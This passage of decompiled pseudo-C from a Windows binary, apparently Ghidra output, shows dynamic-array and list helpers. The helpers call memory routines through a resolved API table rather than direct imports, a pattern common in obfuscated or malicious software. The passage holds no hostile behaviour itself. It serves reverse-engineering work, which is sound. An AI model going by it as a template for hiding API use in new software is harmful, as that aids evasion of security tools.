  }
  return lVar4 != 0;
}



/* FUN_35d4563a0 @ 35d4563a0 */

void FUN_35d4563a0(undefined8 *param_1)

{
  undefined8 uVar1;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  uVar1 = (**(code **)(g_win32_api_table + 0x128))(0,0,0);
  param_1[3] = uVar1;
  return;
}



/* FUN_35d456400 @ 35d456400 */

longlong FUN_35d456400(longlong *param_1,longlong param_2)

{
  return param_2 * 0x28 + *param_1;
}



/* FUN_35d456430 @ 35d456430 */

undefined8 FUN_35d456430(longlong *param_1,ulonglong param_2)

{
  undefined8 *puVar1;
  undefined8 uVar2;
  undefined8 *puVar3;
  ulonglong local_18;
  
  local_18 = param_2;
  if (param_2 < (ulonglong)param_1[2]) {
    for (; local_18 < param_1[2] - 1U; local_18 = local_18 + 1) {
      puVar1 = (undefined8 *)(*param_1 + (local_18 + 1) * 0x18);
      puVar3 = (undefined8 *)(*param_1 + local_18 * 0x18);
      uVar2 = puVar1[1];
      *puVar3 = *puVar1;
      puVar3[1] = uVar2;
      puVar3[2] = puVar1[2];
    }
    param_1[2] = param_1[2] + -1;
    uVar2 = 1;
  }
  else {
    uVar2 = 0;
  }
  return uVar2;
}



/* FUN_35d4564f0 @ 35d4564f0 */

undefined8 FUN_35d4564f0(longlong *param_1,longlong param_2)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  longlong lVar3;
  undefined8 uVar4;
  ulonglong local_18;
  
  lVar3 = (**(code **)(g_win32_api_table + 0x120))(param_1[3],0,param_2 * 0x18);
  if (lVar3 == 0) {
    uVar4 = 0;
  }
  else {
    if (*param_1 != 0) {
      for (local_18 = 0; local_18 < (ulonglong)param_1[2]; local_18 = local_18 + 1) {
        puVar1 = (undefined8 *)(*param_1 + local_18 * 0x18);
        puVar2 = (undefined8 *)(local_18 * 0x18 + lVar3);
        uVar4 = puVar1[1];
        *puVar2 = *puVar1;
        puVar2[1] = uVar4;
        puVar2[2] = puVar1[2];
      }
      (**(code **)(g_win32_api_table + 0x140))(param_1[3],0,*param_1);
    }
    *param_1 = lVar3;
    param_1[1] = param_2;
    uVar4 = 1;
  }
  return uVar4;
}



/* FUN_35d456630 @ 35d456630 */

bool FUN_35d456630(longlong *param_1,undefined8 *param_2)

{
  longlong lVar1;
  undefined8 uVar2;
  longlong lVar3;
  undefined8 *puVar4;
  
  if ((ulonglong)param_1[1] <= (ulonglong)param_1[2]) {
    if (param_1[1] == 0) {
      lVar3 = 1;
    }
    else {
      lVar3 = param_1[1] * 2;
    }
    FUN_35d4564f0(param_1,lVar3);
  }
  lVar3 = *param_1;
  if (lVar3 != 0) {
    lVar1 = param_1[2];
    param_1[2] = lVar1 + 1;
    puVar4 = (undefined8 *)(*param_1 + lVar1 * 0x18);
    uVar2 = param_2[1];
    *puVar4 = *param_2;
    puVar4[1] = uVar2;
    puVar4[2] = param_2[2];
  }
  return lVar3 != 0;
}



/* FUN_35d4566f0 @ 35d4566f0 */

void FUN_35d4566f0(undefined8 *param_1)

{
  undefined8 uVar1;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  uVar1 = (**(code **)(g_win32_api_table + 0x128))(0,0,0);
  param_1[3] = uVar1;
  return;
}



/* FUN_35d456750 @ 35d456750 */

longlong FUN_35d456750(longlong *param_1,longlong param_2)

{
  return param_2 * 0x18 + *param_1;
}



/* FUN_35d456780 @ 35d456780 */

undefined8 FUN_35d456780(longlong *param_1,ulonglong param_2)

{
  undefined8 uVar1;
  ulonglong local_10;
  
  local_10 = param_2;
  if (param_2 < (ulonglong)param_1[2]) {
    for (; local_10 < param_1[2] - 1U; local_10 = local_10 + 1) {
      *(undefined8 *)(local_10 * 8 + *param_1) = *(undefined8 *)(*param_1 + (local_10 + 1) * 8);
    }
    param_1[2] = param_1[2] + -1;
    uVar1 = 1;
  }
  else {
    uVar1 = 0;
  }
  return uVar1;
}



/* FUN_35d456810 @ 35d456810 */

undefined8 FUN_35d456810(longlong *param_1,longlong param_2)

{
  longlong lVar1;
  undefined8 uVar2;
  ulonglong local_10;
  
  lVar1 = (**(code **)(g_win32_api_table + 0x120))(param_1[3],0,param_2 * 8);
  if (lVar1 == 0) {
    uVar2 = 0;
  }
  else {
    if (*param_1 != 0) {
      for (local_10 = 0; local_10 < (ulonglong)param_1[2]; local_10 = local_10 + 1) {
        *(undefined8 *)(lVar1 + local_10 * 8) = *(undefined8 *)(*param_1 + local_10 * 8);
      }
      (**(code **)(g_win32_api_table + 0x140))(param_1[3],0,*param_1);
    }
    *param_1 = lVar1;
    param_1[1] = param_2;
    uVar2 = 1;
  }
  return uVar2;
}



/* FUN_35d456910 @ 35d456910 */

void FUN_35d456910(longlong *param_1)

{
  if (*param_1 != 0) {
    (**(code **)(g_win32_api_table + 0x140))(param_1[3],0,*param_1);
  }
  (**(code **)(g_win32_api_table + 0x130))(param_1[3]);
  return;
}



/* FUN_35d456980 @ 35d456980 */

bool FUN_35d456980(longlong *param_1,undefined8 *param_2)

{
  undefined8 uVar1;
  longlong lVar2;
  longlong lVar3;
  
  if ((ulonglong)param_1[1] <= (ulonglong)param_1[2]) {
    if (param_1[1] == 0) {
      lVar3 = 1;
    }
    else {
      lVar3 = param_1[1] * 2;
    }
    FUN_35d456810(param_1,lVar3);
  }
  lVar3 = *param_1;
  if (lVar3 != 0) {
    uVar1 = *param_2;
    lVar2 = param_1[2];
    param_1[2] = lVar2 + 1;
    *(undefined8 *)(lVar2 * 8 + *param_1) = uVar1;
  }
  return lVar3 != 0;
}



/* FUN_35d456a20 @ 35d456a20 */

void FUN_35d456a20(undefined8 *param_1)

{
  undefined8 uVar1;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  uVar1 = (**(code **)(g_win32_api_table + 0x128))(0,0,0);
  param_1[3] = uVar1;
  return;
}



/* FUN_35d456a80 @ 35d456a80 */

longlong FUN_35d456a80(longlong *param_1,longlong param_2)

{
  return *param_1 + param_2 * 8;
}



/* linked_list_init_2 @ 35d456aa0 */

void linked_list_init_2(undefined8 *param_1)

{
  FUN_35d4566f0(param_1);
  return;
}



/* connector_base_init @ 35d456b30 */

void connector_base_init(undefined8 *param_1)

{
  *param_1 = &DAT_35d4584b0;
  return;
}



/* FUN_35d456b50 @ 35d456b50 */

void FUN_35d456b50(undefined8 *param_1)

{
  *param_1 = &DAT_35d4584b0;
  return;
}



/* linked_list_init_3 @ 35d456b70 */

void linked_list_init_3(undefined8 *param_1)

{
  FUN_35d455c90(param_1);
  return;
}



/* FUN_35d456c20 @ 35d456c20 */

ulonglong FUN_35d456c20(longlong *param_1,int *param_2)

{
  ulonglong local_10;
  
  local_10 = 0;
  while( true ) {
    if ((ulonglong)param_1[2] <= local_10) {
      return 0xffffffff;
    }
    if (*(int *)(local_10 * 0x28 + *param_1) == *param_2) break;
    local_10 = local_10 + 1;
  }
  return local_10;
}



/* FUN_35d456c90 @ 35d456c90 */

bool FUN_35d456c90(longlong *param_1,int *param_2)

{
  ulonglong uVar1;
  
  uVar1 = FUN_35d456c20(param_1,param_2);
  return (int)uVar1 != -1;
}



/* FUN_35d456cd0 @ 35d456cd0 */

undefined8 FUN_35d456cd0(longlong param_1)

{
  return *(undefined8 *)(param_1 + 0x10);
}



/* FUN_35d456cf0 @ 35d456cf0 */

undefined8 FUN_35d456cf0(longlong param_1)

{
  return *(undefined8 *)(param_1 + 0x10);
}



/* FUN_35d456d10 @ 35d456d10 */

undefined8 FUN_35d456d10(longlong param_1)

{
  return *(undefined8 *)(param_1 + 0x10);
}



/* FUN_35d456d30 @ 35d456d30 */

undefined8 FUN_35d456d30(longlong param_1)

{
  return *(undefined8 *)(param_1 + 0x10);
}



/* FUN_35d456d50 @ 35d456d50 */

undefined8 FUN_35d456d50(longlong param_1)

{
  return *(undefined8 *)(param_1 + 0x10);
}



